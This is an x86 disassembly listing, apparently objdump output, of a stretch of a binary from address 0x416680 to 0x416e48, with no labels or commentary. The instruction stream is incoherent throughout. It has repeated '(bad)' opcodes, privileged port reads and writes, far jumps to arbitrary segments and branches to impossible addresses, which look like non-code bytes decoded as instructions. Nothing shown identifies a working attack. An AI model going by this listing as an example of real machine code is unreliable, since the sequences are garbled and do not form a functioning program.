  416680:	mov    esp,0xcd66fc2e
  416685:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416686:	pop    esp
  416687:	(bad)  
  416688:	mov    ds:0x13374497,eax
  41668d:	fiadd  WORD PTR [edi-0x41d62bae]
  416693:	add    cl,ah
  416695:	not    DWORD PTR [esi+0xcadbdbc]
  41669b:	pop    edx
  41669c:	pop    ebp
  41669d:	call   0x74bbd4fc
  4166a2:	add    al,ch
  4166a4:	dec    ecx
  4166a5:	neg    cl
  4166a7:	outs   dx,DWORD PTR ds:[esi]
  4166a8:	mov    dh,0x46
  4166aa:	push   es
  4166ab:	mov    dl,0x3c
  4166ad:	mov    BYTE PTR [ebx-0x3f],dl
  4166b0:	ja     0x416703
  4166b2:	fild   WORD PTR [ecx-0x78]
  4166b5:	jno    0x41665b
  4166b7:	jns    0x4166fd
  4166b9:	or     al,0x6e
  4166bb:	rcl    dl,0x8a
  4166be:	shl    DWORD PTR [ebx+ecx*1],1
  4166c1:	sub    DWORD PTR [edi+0x30861e77],eax
  4166c7:	xchg   DWORD PTR [ebx],ebx
  4166c9:	or     bh,BYTE PTR [ecx+0x2d6ea650]
  4166cf:	int    0x4a
  4166d1:	retf   
  4166d2:	das    
  4166d3:	sub    al,0xbf
  4166d5:	ds push es
  4166d7:	or     esi,edx
  4166d9:	shl    DWORD PTR [ecx-0x3c],cl
  4166dc:	imul   eax,DWORD PTR [esi-0x49],0xe8f315f
  4166e3:	jbe    0x416700
  4166e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4166e6:	test   al,0xec
  4166e8:	dec    ebp
  4166e9:	add    dl,cl
  4166eb:	les    esp,FWORD PTR [eax]
  4166ed:	pop    edx
  4166ee:	rcl    ebx,1
  4166f0:	rcr    DWORD PTR [eax-0x11],cl
  4166f3:	xchg   edi,eax
  4166f4:	add    BYTE PTR [ecx-0x62],cl
  4166f7:	dec    ecx
  4166f8:	pop    es
  4166f9:	in     al,dx
  4166fa:	ror    BYTE PTR [ebp+0x48476bd8],1
  416700:	sar    BYTE PTR ds:0x4a656a77,cl
  416706:	fild   WORD PTR [eax+eiz*8-0x79852cf8]
  41670d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41670e:	les    ebx,FWORD PTR [ebx+0x1ccbd503]
  416714:	cmp    DWORD PTR [esi+0x72],eax
  416717:	jmp    0x18553377
  41671c:	mov    al,ds:0xda6e42df
  416721:	add    al,0x12
  416723:	dec    esi
  416724:	and    BYTE PTR [ebx+eiz*8],ah
  416727:	sub    eax,0xd5c82fb5
  41672c:	fwait
  41672d:	pop    ss
  41672e:	dec    edx
  41672f:	mov    esp,DWORD PTR gs:[ebx-0x63c379d9]
  416736:	push   ebp
  416737:	dec    ebp
  416738:	mov    eax,0x64e23212
  41673d:	xchg   edi,eax
  41673e:	jmp    0x8c53:0x4f5fb076
  416745:	mov    dl,0xd3
  416747:	adc    DWORD PTR [eax+esi*2+0x1e],esi
  41674b:	inc    eax
  41674c:	shl    BYTE PTR [edx+0x1b],0xcc
  416750:	mov    esi,0x6eb4028
  416755:	mul    BYTE PTR [edi-0x31]
  416758:	fsubr  DWORD PTR [bx]
  41675b:	es fs mov eax,cs
  41675f:	push   esp
  416760:	add    al,0xeb
  416762:	xchg   esp,eax
  416763:	jb     0x4167a8
  416765:	pusha  
  416766:	je     0x416783
  416768:	adc    BYTE PTR [edi+0x21],0x74
  41676c:	dec    ecx
  41676d:	push   eax
  41676e:	or     ch,BYTE PTR [esi]
  416770:	mov    edx,0xc9959831
  416775:	mov    ds:0xf19926f0,al
  41677a:	arpl   WORD PTR ss:[edx-0x5f],ax
  41677e:	cmp    BYTE PTR [edi],ah
  416780:	arpl   WORD PTR [edx],bx
  416782:	dec    esi
  416783:	or     ecx,esi
  416785:	pushf  
  416786:	xchg   BYTE PTR [esi],ah
  416788:	or     eax,0x22aca2de
  41678d:	int    0x8c
  41678f:	adc    al,0xc4
  416791:	outs   dx,DWORD PTR ds:[esi]
  416792:	ja     0x41680b
  416794:	sar    DWORD PTR ds:0x20bb07d3,1
  41679a:	or     DWORD PTR [ebx],0xf33137be
  4167a0:	jae    0x4167ca
  4167a2:	nop
  4167a3:	stc    
  4167a4:	test   dl,0x5f
  4167a7:	out    dx,eax
  4167a8:	ror    DWORD PTR [edx-0x32],0xe4
  4167ac:	xchg   DWORD PTR [esi],edx
  4167ae:	dec    ebx
  4167af:	cmp    al,0xa8
  4167b1:	mov    dl,BYTE PTR [ebx+0x43da5263]
  4167b7:	mov    dh,0xf3
  4167b9:	push   ebx
  4167ba:	cmp    al,0x6
  4167bc:	dec    edi
  4167bd:	xchg   esp,eax
  4167be:	mov    edx,0xeafdd39e
  4167c3:	and    cl,BYTE PTR [edx+ecx*4+0x66f29f90]
  4167ca:	mul    esp
  4167cc:	popf   
  4167cd:	mov    al,ds:0xbc7c6f0d
  4167d2:	jmp    0x8c8587ac
  4167d7:	out    dx,al
  4167d8:	jno    0x4167e5
  4167da:	pop    eax
  4167db:	xchg   ecx,eax
  4167dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167dd:	inc    edx
  4167de:	xor    edi,DWORD PTR [edi]
  4167e0:	nop
  4167e1:	add    BYTE PTR [eax-0x77046afd],0xce
  4167e8:	cmp    dh,ch
  4167ea:	push   ss
  4167eb:	pop    edi
  4167ec:	xor    al,0xc
  4167ee:	mov    esp,0x6b09be69
  4167f3:	imul   DWORD PTR [ebx]
  4167f5:	ret    0xb4ba
  4167f8:	test   DWORD PTR [edx+esi*8+0xe87276b],ecx
  4167ff:	pop    ss
  416800:	les    edi,FWORD PTR [edx+eax*4-0xb]
  416804:	xchg   esi,eax
  416805:	add    DWORD PTR [edi+eiz*8],ebx
  416808:	das    
  416809:	push   ss
  41680a:	imul   edx,DWORD PTR [ebx-0x3e],0x22c61f7e
  416811:	lods   eax,DWORD PTR ds:[esi]
  416812:	add    ch,dh
  416814:	pop    ss
  416815:	je     0x416806
  416817:	in     eax,0x91
  416819:	mov    al,ds:0x18029621
  41681e:	jmp    0xef5eee9a
  416823:	xor    edi,DWORD PTR [esi+0x34]
  416826:	mov    cl,0x99
  416828:	push   esp
  416829:	sbb    ah,dl
  41682b:	gs dec ebp
  41682d:	xchg   BYTE PTR [ebp-0xaac5f87],dh
  416833:	jmp    0xe188:0x860a662f
  41683a:	retf   
  41683b:	inc    edx
  41683c:	fist   DWORD PTR [edi+ecx*1]
  41683f:	dec    ebp
  416840:	mov    ebx,0x36bcdebd
  416845:	mov    ?,WORD PTR [esi]
  416847:	mov    ds:0x5d4e1756,al
  41684c:	lods   eax,DWORD PTR ds:[esi]
  41684d:	repnz mul DWORD PTR ss:[edi-0x7a203aca]
  416855:	xchg   ebx,eax
  416856:	arpl   WORD PTR [ecx+0x514cd774],sp
  41685c:	jnp    0x416846
  41685e:	push   ebx
  41685f:	push   esp
  416860:	push   edx
  416861:	je     0x416860
  416863:	jmp    0x41688b
  416865:	xchg   edi,eax
  416866:	pop    edi
  416867:	xchg   ebx,eax
  416868:	mov    dh,0x1e
  41686a:	mov    edi,0xdc99ad9
  41686f:	call   0x40965c8b
  416874:	popf   
  416875:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416876:	add    al,0x13
  416878:	sbb    BYTE PTR [ebp-0x3b4fee9e],0xc4
  41687f:	mov    cl,0x0
  416881:	iret   
  416882:	out    0x14,eax
  416884:	add    esi,edi
  416886:	dec    ebx
  416887:	adc    BYTE PTR [eax+ecx*1+0x7db987e9],al
  41688e:	cmp    BYTE PTR [eax-0x1b],ah
  416891:	xchg   ebp,eax
  416892:	jne    0x4168b0
  416894:	daa    
  416895:	out    0x6a,eax
  416897:	div    DWORD PTR [ebp-0x6fe1e11e]
  41689d:	push   0xffffffea
  41689f:	fs scas al,BYTE PTR es:[edi]
  4168a1:	xchg   edi,eax
  4168a2:	js     0x4168d0
  4168a4:	fdivr  QWORD PTR [eax-0x10d56383]
  4168aa:	xchg   ebp,eax
  4168ab:	sub    bl,bl
  4168ad:	jmp    0x563dd909
  4168b2:	cs mov ebp,0xceca22a5
  4168b8:	mov    ah,0x6
  4168ba:	rol    ah,1
  4168bc:	cmc    
  4168bd:	test   DWORD PTR [ebx+0x9],ebp
  4168c0:	sar    DWORD PTR [edx-0x68],cl
  4168c3:	outs   dx,BYTE PTR ds:[esi]
  4168c4:	and    eax,0x604a5728
  4168c9:	ficom  WORD PTR [ecx-0x3f]
  4168cc:	cmp    ebp,eax
  4168ce:	out    dx,eax
  4168cf:	rcl    DWORD PTR [ebx+edi*2+0x57b0d693],0x52
  4168d7:	scas   al,BYTE PTR es:[edi]
  4168d8:	and    BYTE PTR [edi-0x3a],0x44
  4168dc:	dec    eax
  4168dd:	jmp    0x5bf8:0xb33661a2
  4168e4:	fwait
  4168e5:	ss jb  0x416895
  4168e8:	xchg   edx,eax
  4168e9:	and    ebp,DWORD PTR [edx]
  4168eb:	pop    ecx
  4168ec:	test   ebp,edi
  4168ee:	inc    ebx
  4168ef:	jecxz  0x41691d
  4168f1:	sub    DWORD PTR [esi+0x38764e66],ebx
  4168f7:	xchg   edi,eax
  4168f8:	dec    edx
  4168f9:	mul    BYTE PTR [edi+0x45072bf9]
  4168ff:	dec    esp
  416900:	mov    eax,ds:0xd20c6213
  416905:	and    eax,0x1ad192cf
  41690a:	pop    ds
  41690b:	dec    ebx
  41690c:	adc    ch,BYTE PTR [esi-0x472dffa6]
  416912:	pop    ebp
  416913:	push   esp
  416914:	ins    DWORD PTR es:[edi],dx
  416915:	int    0x4b
  416917:	adc    dl,al
  416919:	or     ah,BYTE PTR [eax-0x30]
  41691c:	aaa    
  41691d:	adc    eax,0x7c0aa568
  416922:	add    eax,0xf8375a47
  416927:	je     0x4168be
  416929:	dec    ecx
  41692a:	mov    ebx,0x2fbcdeac
  41692f:	cld    
  416930:	bound  esi,QWORD PTR [ecx]
  416932:	sub    DWORD PTR [ecx],edi
  416934:	repz dec ah
  416937:	pushf  
  416938:	inc    edi
  416939:	inc    ebp
  41693a:	cwde   
  41693b:	jmp    0xc46c670c
  416940:	mov    bl,0x57
  416942:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416943:	xchg   edx,eax
  416944:	cmp    DWORD PTR [esi+0x456a25d8],edi
  41694a:	push   0xffffffb4
  41694c:	xor    BYTE PTR [ebp+0x72],dh
  41694f:	and    edi,esi
  416951:	mov    dl,0x7e
  416953:	xor    bl,0xf9
  416956:	lods   eax,DWORD PTR ds:[esi]
  416957:	xchg   DWORD PTR [ebp-0x33],edx
  41695a:	scas   eax,DWORD PTR es:[edi]
  41695b:	add    esi,0xffffffbc
  41695e:	rol    BYTE PTR [ebx+0x4c],0xaf
  416962:	test   BYTE PTR [ebx],al
  416964:	and    eax,0x4df241e6
  416969:	ins    BYTE PTR es:[edi],dx
  41696a:	inc    edi
  41696b:	sbb    DWORD PTR [edx],esp
  41696d:	sub    dh,cl
  41696f:	(bad)  
  416970:	fbstp  TBYTE PTR [esi*8+0x5cf4492b]
  416977:	in     eax,0xe5
  416979:	and    eax,0x7b816737
  41697e:	leave  
  41697f:	jmp    0x41692b
  416981:	lods   eax,DWORD PTR ds:[esi]
  416982:	xor    dh,ah
  416984:	bound  edx,QWORD PTR [edx+0x26]
  416987:	lock mov eax,0xda1b2134
  41698d:	push   edi
  41698e:	imul   ecx,DWORD PTR [ebx+0x4c],0x7b
  416992:	das    
  416993:	in     al,dx
  416994:	jnp    0x416963
  416996:	push   ebx
  416997:	push   esp
  416998:	je     0x4169bf
  41699a:	call   0xff799302
  41699f:	test   eax,0xf4ddb23c
  4169a4:	nop
  4169a5:	push   esi
  4169a6:	adc    edi,DWORD PTR [edi+0x1892f48d]
  4169ac:	hlt    
  4169ad:	and    ebp,DWORD PTR [edx+0x9613883]
  4169b3:	mov    al,0x5
  4169b5:	push   eax
  4169b6:	push   0x47
  4169b8:	adc    BYTE PTR [edi],ah
  4169ba:	and    BYTE PTR [edi-0x21],cl
  4169bd:	fldlg2 
  4169bf:	frstor [edi]
  4169c1:	push   0xffffffc0
  4169c3:	dec    edx
  4169c4:	pop    eax
  4169c5:	nop
  4169c6:	jecxz  0x41695a
  4169c8:	pop    eax
  4169c9:	repz mov ds:0xcfb9a654,eax
  4169cf:	mov    esi,0xcae02cbf
  4169d4:	sbb    al,BYTE PTR [esi-0x61]
  4169d7:	lods   al,BYTE PTR ds:[esi]
  4169d8:	mov    cl,0x22
  4169da:	push   es
  4169db:	jmp    FWORD PTR [edx]
  4169dd:	xor    esp,DWORD PTR [esi]
  4169df:	repnz inc edx
  4169e1:	add    ch,BYTE PTR [eax-0x602eda39]
  4169e7:	shl    BYTE PTR [ebp+0x3a98716f],0x8
  4169ee:	cmc    
  4169ef:	xor    eax,0xb15ed20f
  4169f4:	in     eax,0x44
  4169f6:	mov    cs,WORD PTR [edx]
  4169f8:	jg     0x416a32
  4169fa:	std    
  4169fb:	sti    
  4169fc:	test   DWORD PTR [ebp+0x46],eax
  4169ff:	in     eax,dx
  416a00:	inc    esp
  416a01:	in     al,0x9b
  416a03:	xchg   ebp,eax
  416a04:	mov    cl,0x51
  416a06:	leave  
  416a07:	(bad)  
  416a08:	ss pushf 
  416a0a:	fwait
  416a0b:	jmp    0xd67ff0e2
  416a10:	adc    BYTE PTR [ecx+ebx*4+0x13],dl
  416a14:	cmp    al,0x39
  416a16:	xchg   esp,eax
  416a17:	add    eax,0x97644301
  416a1c:	push   ds
  416a1d:	mov    esi,0xf0147ba2
  416a22:	push   eax
  416a23:	clc    
  416a24:	lods   al,BYTE PTR ds:[esi]
  416a25:	shl    DWORD PTR [eax-0x6d8c4c0a],cl
  416a2b:	sub    DWORD PTR [ebx+0x3],edi
  416a2e:	xchg   esi,eax
  416a2f:	xchg   DWORD PTR [edx+ecx*4-0x11],ebp
  416a33:	push   ebx
  416a34:	adc    al,0x9f
  416a36:	xchg   edi,eax
  416a37:	cmp    eax,0x2c024d86
  416a3c:	ins    DWORD PTR es:[edi],dx
  416a3d:	or     cl,BYTE PTR [esi-0x28]
  416a40:	aad    0xfa
  416a42:	sbb    ecx,ecx
  416a44:	xor    BYTE PTR [edi],ah
  416a46:	fisttp DWORD PTR [ecx-0xc7db785]
  416a4c:	sbb    ah,BYTE PTR [esi+0x71]
  416a4f:	mov    bl,0x30
  416a51:	mov    ecx,0xa024fb4
  416a56:	out    dx,eax
  416a57:	inc    ebp
  416a58:	jmp    0x4169e5
  416a5a:	inc    esi
  416a5b:	sub    edx,eax
  416a5d:	sti    
  416a5e:	push   ebx
  416a5f:	std    
  416a60:	xchg   esi,eax
  416a61:	and    eax,0x79808219
  416a66:	neg    DWORD PTR [esi-0x27]
  416a69:	add    al,0x9
  416a6b:	call   0x6c1a569b
  416a70:	add    DWORD PTR [edx+0x557c7713],esi
  416a76:	out    0x11,al
  416a78:	jmp    0xeb20:0x13a69afb
  416a7f:	and    DWORD PTR [esi],ecx
  416a81:	(bad)  
  416a82:	and    ebp,esp
  416a84:	sub    al,0x4c
  416a86:	or     DWORD PTR [edi-0x28],ecx
  416a89:	xor    al,0x2a
  416a8b:	push   esi
  416a8c:	dec    edx
  416a8d:	pop    ecx
  416a8e:	jl     0x416ac6
  416a90:	fimul  DWORD PTR [edi-0x412ef7b]
  416a96:	pop    eax
  416a97:	xchg   edx,eax
  416a98:	add    BYTE PTR [ebx+0x689db879],dh
  416a9e:	pop    edi
  416a9f:	scas   al,BYTE PTR es:[edi]
  416aa0:	int    0xb
  416aa2:	cdq    
  416aa3:	div    BYTE PTR [ebx+0x36]
  416aa6:	enter  0xaad4,0xa4
  416aaa:	mov    edi,0xeeb30b67
  416aaf:	(bad)  
  416ab0:	mov    cl,0xfc
  416ab2:	in     al,0x4d
  416ab4:	ret    
  416ab5:	push   ss
  416ab6:	pop    esi
  416ab7:	arpl   WORD PTR [edi-0x642c9f09],ax
  416abd:	fnsave [eax+0x58]
  416ac0:	pop    DWORD PTR [esi+0x41]
  416ac3:	cmp    edx,esi
  416ac5:	jmp    0x490f717a
  416aca:	popa   
  416acb:	jno    0x416b07
  416acd:	cwde   
  416ace:	nop
  416acf:	push   eax
  416ad0:	ror    BYTE PTR [ecx+ebp*8+0x4b],0x12
  416ad5:	lods   al,BYTE PTR ds:[esi]
  416ad6:	sbb    eax,0xcd648445
  416adb:	fisttp QWORD PTR [edi+0x65cf43c7]
  416ae1:	jno    0x416ac7
  416ae3:	ja     0x416b40
  416ae5:	test   al,0x4a
  416ae7:	mov    al,ds:0xa9912f8c
  416aec:	mov    ebx,0x1246d0dd
  416af1:	test   DWORD PTR [eax+0x25a33a34],eax
  416af7:	inc    esi
  416af8:	popa   
  416af9:	lods   eax,DWORD PTR ds:[esi]
  416afa:	cs hlt 
  416afc:	add    BYTE PTR [ebp-0x33],0x81
  416b00:	sub    dl,bh
  416b02:	repnz mov dl,0x99
  416b05:	sbb    BYTE PTR [edi],bh
  416b07:	sbb    eax,0x6f2eb09e
  416b0c:	fwait
  416b0d:	repnz and edx,edx
  416b10:	jno    0x416ab4
  416b12:	sub    cl,BYTE PTR [ebp-0x51]
  416b15:	in     eax,dx
  416b16:	ror    BYTE PTR [edx+0x2c10c42e],cl
  416b1c:	mov    bl,0x3c
  416b1e:	call   0xf1780aea
  416b23:	jae    0x416b21
  416b25:	dec    ecx
  416b26:	loope  0x416b36
  416b28:	not    ecx
  416b2a:	jb     0x416b97
  416b2c:	idiv   DWORD PTR [ecx+eax*4]
  416b2f:	sub    DWORD PTR [ebx+0x1e],ebx
  416b32:	shl    BYTE PTR [eax],0xc8
  416b35:	lock or BYTE PTR [esi-0x66],0xb5
  416b3a:	lds    edi,FWORD PTR [esi]
  416b3c:	scas   eax,DWORD PTR es:[edi]
  416b3d:	test   BYTE PTR [esp+eiz*2-0x22],0x87
  416b42:	mov    ecx,0x51954466
  416b47:	aas    
  416b48:	jnp    0x416b41
  416b4a:	push   0xdaa3a57e
  416b4f:	sbb    BYTE PTR [ecx],bh
  416b51:	sbb    BYTE PTR [edx],ch
  416b53:	pop    ecx
  416b54:	sbb    DWORD PTR [ebp-0x59],ebp
  416b57:	inc    ebp
  416b58:	or     BYTE PTR [edi-0x7f767ee0],bl
  416b5e:	aaa    
  416b5f:	cmp    DWORD PTR [ebp+0x6f1154ca],edx
  416b65:	(bad)  
  416b66:	(bad)  
  416b67:	sahf   
  416b68:	mov    esp,DWORD PTR [esi+0x2e]
  416b6b:	jl     0x416b4f
  416b6d:	jno    0x416b44
  416b6f:	shl    DWORD PTR [edx-0x2d],1
  416b72:	cmp    BYTE PTR ds:[edi],bl
  416b75:	sbb    DWORD PTR [edi-0x796f3d07],eax
  416b7b:	lea    esi,[edx+0x10c88123]
  416b81:	sbb    cl,BYTE PTR [edi+eax*8-0x483cb3a5]
  416b88:	rol    DWORD PTR [edi],cl
  416b8a:	(bad)
  416b8d:	push   es
  416b8e:	retf   0xcef0
  416b91:	(bad)  
  416b92:	popa   
  416b93:	daa    
  416b94:	(bad)
  416b97:	or     al,0x61
  416b99:	daa    
  416b9a:	test   DWORD PTR [esi-0x12528707],ebx
  416ba0:	push   ss
  416ba1:	rol    DWORD PTR [ebx+0x50c57aaa],cl
  416ba7:	or     BYTE PTR [ecx+0x64],0x11
  416bab:	lods   al,BYTE PTR ds:[esi]
  416bac:	jmp    0x65c8:0x479d6146
  416bb3:	aad    0x17
  416bb5:	pop    edi
  416bb6:	mov    edx,0xc81b5d53
  416bbc:	cmp    ebx,DWORD PTR [edx+0x5c7032f1]
  416bc2:	jb     0x416c14
  416bc4:	mov    ebx,0x874e434a
  416bc9:	push   esi
  416bca:	push   ebp
  416bcb:	scas   al,BYTE PTR es:[edi]
  416bcc:	sbb    al,0x5d
  416bce:	cld    
  416bcf:	jae    0x416b6a
  416bd1:	retf   0xe805
  416bd4:	add    eax,0xdcf20347
  416bd9:	xor    bh,BYTE PTR [ebx]
  416bdb:	or     ebx,esp
  416bdd:	loope  0x416be2
  416bdf:	sbb    al,0x7a
  416be1:	cmp    ch,BYTE PTR [esp+ebp*4+0x5c8b707f]
  416be8:	out    dx,al
  416be9:	aas    
  416bea:	scas   eax,DWORD PTR es:[edi]
  416beb:	dec    ebp
  416bec:	fcmovnb st,st(6)
  416bee:	sbb    dl,BYTE PTR [ecx-0x7]
  416bf1:	add    al,0x4
  416bf3:	not    DWORD PTR [edi]
  416bf5:	(bad)  
  416bf6:	push   ss
  416bf7:	ins    BYTE PTR es:[edi],dx
  416bf8:	enter  0x378,0x23
  416bfc:	mov    cl,0xf1
  416bfe:	sub    eax,0x16cb528e
  416c03:	pop    ds
  416c04:	jmp    0x416bb0
  416c06:	inc    esp
  416c07:	inc    edi
  416c08:	add    ebx,DWORD PTR [eax-0x6c08844f]
  416c0e:	mov    ebx,0xae355cfb
  416c13:	outs   dx,BYTE PTR ds:[esi]
  416c14:	cs test eax,0xc446504f
  416c1a:	out    dx,eax
  416c1b:	push   0x5e
  416c1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c1e:	das    
  416c1f:	mov    DWORD PTR [esi],eax
  416c21:	mov    cl,0x93
  416c23:	dec    edi
  416c24:	pop    ecx
  416c25:	in     eax,0x12
  416c27:	bound  ebp,QWORD PTR [esi-0x6d]
  416c2a:	stc    
  416c2b:	and    DWORD PTR [ecx],0xfffffffc
  416c2e:	sub    ch,BYTE PTR [edi]
  416c30:	push   edx
  416c31:	mov    al,ds:0xb1305f70
  416c36:	sub    al,0xc5
  416c38:	clc    
  416c39:	shr    BYTE PTR [edi+0x63b69b98],0xe1
  416c40:	jge    0x416cac
  416c42:	sub    esp,esp
  416c44:	add    eax,0xd334d107
  416c49:	mov    al,0x1f
  416c4b:	dec    ebp
  416c4c:	and    ebx,DWORD PTR [ecx-0x7d]
  416c4f:	and    edx,DWORD PTR [ecx-0x21]
  416c52:	dec    edx
  416c53:	int    0x58
  416c55:	mov    edi,0x91fbcaa
  416c5a:	xchg   ah,bh
  416c5c:	or     ebp,ecx
  416c5e:	and    al,ch
  416c60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c61:	popf   
  416c62:	lds    edx,FWORD PTR [ebx]
  416c64:	cwde   
  416c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c66:	je     0x416c8f
  416c68:	cmp    bl,BYTE PTR [eax-0x31]
  416c6b:	lahf   
  416c6c:	in     al,0x4b
  416c6e:	push   ebp
  416c6f:	loope  0x416c2d
  416c71:	mov    esp,esi
  416c73:	cwde   
  416c74:	sub    DWORD PTR [ebp+ebx*2+0x40bc3d73],esp
  416c7b:	arpl   WORD PTR [ecx-0x51df87e3],ax
  416c81:	out    0xcb,eax
  416c83:	sub    BYTE PTR [eax-0x6ab21570],cl
  416c89:	adc    BYTE PTR [ebp+0x65],0x6c
  416c8d:	dec    ebx
  416c8e:	or     bl,al
  416c90:	scas   al,BYTE PTR es:[edi]
  416c91:	into   
  416c92:	xchg   ecx,eax
  416c93:	and    eax,0x602d8295
  416c98:	sti    
  416c99:	cli    
  416c9a:	jl     0x416ce9
  416c9c:	sbb    ah,al
  416c9e:	xor    esi,DWORD PTR [eax-0x2c]
  416ca1:	pop    edi
  416ca2:	push   edx
  416ca3:	mov    bl,BYTE PTR [edi+0x7d]
  416ca6:	sbb    BYTE PTR [esi],0x4b
  416ca9:	or     BYTE PTR [edx+0x6b],al
  416cac:	jmp    0x416d1f
  416cae:	(bad)  
  416caf:	mov    al,0xf4
  416cb1:	aas    
  416cb2:	push   ss
  416cb3:	sub    al,0x41
  416cb5:	js     0x416c3e
  416cb7:	std    
  416cb8:	rcr    DWORD PTR [eax+0x7440f8da],cl
  416cbe:	aad    0xf4
  416cc0:	pop    es
  416cc1:	push   eax
  416cc2:	scas   al,BYTE PTR es:[edi]
  416cc3:	ffreep st(1)
  416cc5:	pop    esp
  416cc6:	and    eax,0x448c4e13
  416ccb:	dec    ecx
  416ccc:	sbb    DWORD PTR [edx+0x2b],esp
  416ccf:	sub    esp,edx
  416cd1:	loope  0x416ce1
  416cd3:	js     0xb329e8a2
  416cd9:	(bad)  
  416cdb:	push   ecx
  416cdc:	add    esp,DWORD PTR [edx-0x380d578d]
  416ce2:	mov    bl,BYTE PTR [eax]
  416ce4:	fidiv  WORD PTR [edx+ebx*2+0x16]
  416ce8:	test   al,0x88
  416cea:	mov    DWORD PTR [eax+0x11],esi
  416ced:	test   ah,dl
  416cef:	xchg   ebp,eax
  416cf0:	repnz in al,dx
  416cf2:	clc    
  416cf3:	adc    al,ah
  416cf5:	loope  0x416d48
  416cf7:	outs   dx,DWORD PTR ds:[esi]
  416cf8:	(bad)  
  416cf9:	or     BYTE PTR [ebp+0x23ea6db7],0x3e
  416d00:	js     0x416ce8
  416d02:	and    BYTE PTR [ebp-0x1e],dh
  416d05:	xor    ebx,DWORD PTR ds:0x6fd8194b
  416d0b:	cmp    DWORD PTR [ecx+0x2b4cba47],0xffffffd0
  416d12:	or     DWORD PTR [eax+0x70c61787],esi
  416d18:	mov    ch,BYTE PTR [ebp+eax*1-0x4f71a3d8]
  416d1f:	sub    BYTE PTR [ebp+0x5b],cl
  416d22:	pop    bp
  416d24:	popf   
  416d25:	loopne 0x416d72
  416d27:	xor    DWORD PTR [esi+0x5d],0x6c
  416d2b:	mov    esp,0x2393dce
  416d30:	int3   
  416d31:	out    dx,eax
  416d32:	xchg   BYTE PTR [ebp-0x70],al
  416d35:	push   esp
  416d36:	mov    cl,0x33
  416d38:	dec    edi
  416d39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d3a:	test   BYTE PTR [ecx+edi*2],dl
  416d3d:	test   BYTE PTR [esi-0x48],0x78
  416d41:	retf   
  416d42:	lock (bad) 
  416d44:	push   ss
  416d45:	mov    DWORD PTR [edi*1-0x42e411d8],edx
  416d4c:	xchg   edx,eax
  416d4d:	dec    esp
  416d4e:	pushf  
  416d4f:	out    0xb4,eax
  416d51:	pop    edi
  416d52:	fwait
  416d53:	adc    eax,0xf57387ff
  416d58:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d59:	cmp    esp,DWORD PTR [ecx+0x460bbd22]
  416d5f:	jno    0x416d5f
  416d61:	adc    ch,BYTE PTR [ebx-0xeb18592]
  416d67:	pop    es
  416d68:	mov    al,0x26
  416d6b:	mov    al,ds:0xbf803618
  416d70:	enter  0x62a,0x0
  416d74:	jg     0x416df0
  416d76:	daa    
  416d77:	out    0x3e,al
  416d79:	mov    ds:0xe49db33f,eax
  416d7e:	cs push ecx
  416d80:	cmp    ch,al
  416d82:	mov    esi,0x6a84dccb
  416d87:	sbb    DWORD PTR [eax+0x55bdd31f],esi
  416d8d:	jg     0x416dce
  416d8f:	icebp  
  416d90:	test   BYTE PTR [edx+eax*1+0x6a4a25ee],bl
  416d97:	cmp    BYTE PTR [edi],0x9
  416d9a:	ins    DWORD PTR es:[edi],dx
  416d9b:	pop    esp
  416d9c:	outs   dx,DWORD PTR ds:[esi]
  416d9d:	jae    0x416dae
  416d9f:	call   0x4a0:0xf888dc1c
  416da6:	cmp    al,0xd8
  416da8:	sahf   
  416da9:	icebp  
  416daa:	mov    edx,esi
  416dac:	add    DWORD PTR [edx+0x9bc9652],eax
  416db2:	xlat   BYTE PTR ds:[ebx]
  416db3:	rcr    BYTE PTR [eax],0xc
  416db6:	cdq    
  416db7:	loope  0x416de0
  416db9:	push   ebp
  416dba:	jecxz  0x416dc9
  416dbc:	fild   WORD PTR [ecx-0x6f]
  416dbf:	push   es
  416dc0:	xor    BYTE PTR ds:0xa2747c47,al
  416dc6:	outs   dx,BYTE PTR ds:[esi]
  416dc7:	ret    0x5636
  416dca:	fbstp  TBYTE PTR [esi+0x30]
  416dcd:	mov    ds:0xb4c03bbe,eax
  416dd2:	mov    bl,0xda
  416dd4:	xchg   edx,eax
  416dd5:	js     0x416e45
  416dd7:	dec    ebx
  416dd8:	cli    
  416dd9:	sbb    eax,eax
  416ddb:	push   ds
  416ddc:	or     dl,BYTE PTR [eax-0xe35524]
  416de2:	xchg   edx,eax
  416de3:	push   0x76
  416de5:	das    
  416de6:	out    0x98,al
  416de8:	cmp    dl,BYTE PTR [eax+eiz*8-0x14]
  416dec:	jno    0x416df2
  416dee:	repnz ss aad 0x6e
  416df2:	aad    0xd6
  416df4:	pop    esi
  416df5:	sbb    BYTE PTR [ebp+ebx*1-0x7f],0x20
  416dfa:	hlt    
  416dfb:	cli    
  416dfc:	je     0x416ddf
  416dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416dff:	adc    esp,DWORD PTR [ebx-0x2]
  416e02:	lds    edx,FWORD PTR [edi+0x69]
  416e05:	not    DWORD PTR [edx+edi*8+0x674c6211]
  416e0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416e0d:	mov    ebx,DWORD PTR [ebp-0x12]
  416e10:	pop    ecx
  416e11:	arpl   WORD PTR [edi-0x16],bp
  416e14:	fldcw  WORD PTR [ebx-0x5d02e15c]
  416e1a:	call   0x156d:0xd0da03f3
  416e21:	outs   dx,DWORD PTR ds:[esi]
  416e22:	gs ret 
  416e24:	jle    0x416db9
  416e26:	into   
  416e27:	mov    edi,0x9beb917b
  416e2c:	xor    al,0x80
  416e2e:	mov    bp,0x6004
  416e32:	inc    esp
  416e33:	inc    edx
  416e34:	xor    eax,0x5a036f98
  416e39:	test   BYTE PTR [ebx+0x3c60b441],dl
  416e3f:	mov    al,0xf3
  416e41:	inc    ebp
  416e42:	sub    DWORD PTR [eax-0xe],edi
  416e45:	or     al,BYTE PTR [ebp-0x3d]
  416e48:	mov    edx,0xb6f2faae
